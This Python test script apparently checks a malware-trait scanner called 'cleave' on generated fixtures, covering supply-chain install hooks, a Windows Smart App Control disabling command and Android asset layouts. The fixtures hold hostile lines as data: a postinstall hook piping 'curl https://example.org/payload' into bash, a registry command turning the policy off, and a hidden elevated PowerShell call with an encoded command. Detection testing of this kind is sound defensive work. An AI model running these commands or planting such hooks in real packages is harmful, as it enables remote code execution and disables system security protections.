"""Exercise reference exclusions and Smart App Control call context."""
import json
import pathlib
import subprocess
import sys
import zipfile

out = pathlib.Path(sys.argv[1])
out.mkdir(parents=True, exist_ok=True)
root = 'supply-chain-guard-9.0.0/'
repository = 'https://github.com/homeofe/supply-chain-guard.git'
hook = {'name': 'fixture', 'scripts': {'postinstall': 'curl https://example.org/payload | bash'}}
target = 'objectives/supply-chain/install-hook/scripts/postinstall::curl-pipe-shell'
results = []
for label, member, repo, expected in [
    ('reviewed-fixture', 'src/__tests__/fixtures/pkg/package.json', repository, False),
    ('runtime-control', 'src/runtime/package.json', repository, True),
    ('path-control', 'src/__tests__/fixtures/pkg/package.json', repository, True),
]:
    archive = out / (label + '.zip')
    prefix = 'ordinary-package-9.0.0/' if label == 'path-control' else root
    with zipfile.ZipFile(archive, 'w') as z:
        z.writestr(prefix + 'package.json', json.dumps({'name': 'supply-chain-guard', 'repository': {'type': 'git', 'url': repo}}))
        z.writestr(prefix + member, json.dumps(hook))
    proc = subprocess.run(['cleave', '--traits-dir', '.', '--json', str(archive)], capture_output=True, text=True)
    if proc.returncode:
        raise RuntimeError(proc.stderr)
    report = json.loads(proc.stdout)
    matched = any(t['id'] == target for f in report['files'] for t in f.get('traits', []))
    assert matched == expected, (label, matched, expected)
    results.append({'case': label, 'matched': matched})
# Command text stays notable; the suspicious composite also needs execution.
command = "reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy' /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f"
elevation = "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -EncodedCommand AAAA'"
for label, invoke in [('commands-only', False), ('elevation-call', True)]:
    script = out / (label + '.js')
    text = "const policy = " + json.dumps(command) + ";\nconst elevation = " + json.dumps(elevation) + ";\n"
    if invoke:
        text += "const {spawnSync} = require('child_process'); spawnSync('powershell', ['-Command', elevation]);\n"
    script.write_text(text)
    proc = subprocess.run(['cleave', '--traits-dir', '.', '--json', str(script)], capture_output=True, text=True)
    if proc.returncode:
        raise RuntimeError(proc.stderr)
    report = json.loads(proc.stdout)
    ids = {t['id'] for f in report['files'] for t in f.get('traits', [])}
    assert 'micro-behaviors/os/security/policy::reg-smart-app-control-disable-command' in ids
    suspicious = 'objectives/impact/degrade/windows-policy::javascript-smart-app-control-disable' in ids
    assert suspicious == invoke, (label, suspicious, invoke)
    results.append({'case': label, 'suspicious': suspicious})
for label, android in [('jar-asset-control', False), ('apk-asset-layout', True)]:
    archive = out / (label + '.zip')
    with zipfile.ZipFile(archive, 'w') as z:
        z.writestr('assets/dataasset.payload', b'opaque data')
        if android:
            z.writestr('AndroidManifest.xml', b'<manifest package="example.test"/>')
            z.writestr('classes.dex', b'')
            z.writestr('resources.arsc', b'')
        else:
            z.writestr('META-INF/MANIFEST.MF', 'Manifest-Version: 1.0\n')
    proc = subprocess.run(['cleave', '--traits-dir', '.', '--json', str(archive)], capture_output=True, text=True)
    if proc.returncode:
        raise RuntimeError(proc.stderr)
    report = json.loads(proc.stdout)
    ids = {t['id'] for f in report['files'] for t in f.get('traits', [])}
    assert 'metadata/package/files/name::archive-assets-data-member' in ids
    apk = 'metadata/package/files/mobile-package::apk-assets-data-member' in ids
    assert apk == android, (label, apk, android)
    results.append({'case': label, 'apk': apk})
print(json.dumps(results, indent=2))
